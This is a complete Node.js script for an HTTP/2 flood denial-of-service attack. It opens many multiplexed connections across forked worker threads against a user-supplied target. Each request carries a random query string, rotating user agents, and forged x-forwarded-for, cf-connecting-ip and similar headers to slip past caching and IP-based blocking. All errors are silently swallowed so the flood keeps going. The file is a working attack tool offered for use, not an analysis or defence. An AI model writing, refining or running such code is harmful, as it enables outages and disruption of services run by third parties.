const cluster = require('cluster');
const http2 = require('http2');
const crypto = require('crypto');
const url = require('url');
const fs = require('fs');

// Enhanced error suppression
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

if (process.argv.length < 7) {
    console.log('Usage: node http2.js <method> <target> <proxy_file> <time> <rate> <threads>');
    process.exit(1);
}

const method = process.argv[2] || 'GET';
const target = process.argv[3];
const proxyFile = process.argv[4] || 'PROXY.txt';
const time = parseInt(process.argv[5]);
const rate = parseInt(process.argv[6]) * 2; // Double the rate
const threads = parseInt(process.argv[7]);

console.log(`
💨💨💨 HTTP/2 FLOOD ATTACK INITIATED 💨💨💨
🎯 Target: ${target}
🔄 Method: ${method}
⏱ Duration: ${time}s
📊 Rate: ${rate}/s per thread (DOUBLED)
🧵 Threads: ${threads}
🚀 HTTP/2 RAPID FIRE ATTACK!
`);

const targetUrl = url.parse(target);

// Enhanced user agents
const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0'
];

function generateRandomIP() {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

function randomString(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

if (cluster.isMaster) {
    console.log(`🚀 Starting ${threads} HTTP/2 attack threads...`);

    for (let i = 0; i < threads; i++) {
        cluster.fork();
        console.log(`[HTTP/2 Thread ${i + 1}] Attack started`);
    }

    setTimeout(() => {
        console.log('⏰ HTTP/2 attack completed!');
        process.exit(0);
    }, time * 1000);

} else {
    startHTTP2Attack();
}

function startHTTP2Attack() {
    setInterval(() => {
        for (let i = 0; i < rate; i++) {
            setTimeout(() => launchHTTP2Request(), i * 5);
        }
    }, 1000);

    // Continuous flood
    for (let i = 0; i < 10; i++) {
        continuousHTTP2Flood();
    }
}

function launchHTTP2Request() {
    try {
        const client = http2.connect(target, {
            rejectUnauthorized: false,
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 10000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                enablePush: false
            }
        });

        client.on('connect', () => {
            // Send multiple requests per connection
            for (let j = 0; j < 10; j++) {
                const fakeIP = generateRandomIP();
                const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

                const headers = {
                    ':method': method,
                    ':path': `${targetUrl.path}?http2=${randomString(12)}&time=${Date.now()}&req=${j}`,
                    ':authority': targetUrl.hostname,
                    ':scheme': 'https',
                    'user-agent': userAgent,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'accept-language': 'en-US,en;q=0.9',
                    'accept-encoding': 'gzip, deflate, br',
                    'cache-control': 'no-cache',
                    'pragma': 'no-cache',
                    'x-forwarded-for': fakeIP,
                    'x-real-ip': fakeIP,
                    'client-ip': fakeIP,
                    'cf-connecting-ip': fakeIP,
                    'x-originating-ip': fakeIP,
                    'connection': 'keep-alive',
                    'upgrade-insecure-requests': '1'
                };

                const req = client.request(headers);

                req.on('response', () => {
                    req.close();
                });

                req.on('error', () => {});

                if (method === 'POST') {
                    req.write(crypto.randomBytes(1024));
                }

                req.end();
            }
        });

        client.on('error', () => {
            client.close();
        });

        setTimeout(() => {
            try { client.close(); } catch (e) {}
        }, 2000);

    } catch (error) {
        // Continue attacking
    }
}

function continuousHTTP2Flood() {
    setInterval(() => {
        try {
            for (let i = 0; i < 5; i++) {
                setTimeout(() => launchHTTP2Request(), i * 10);
            }
        } catch (error) {
            // Continue
        }
    }, 500);
}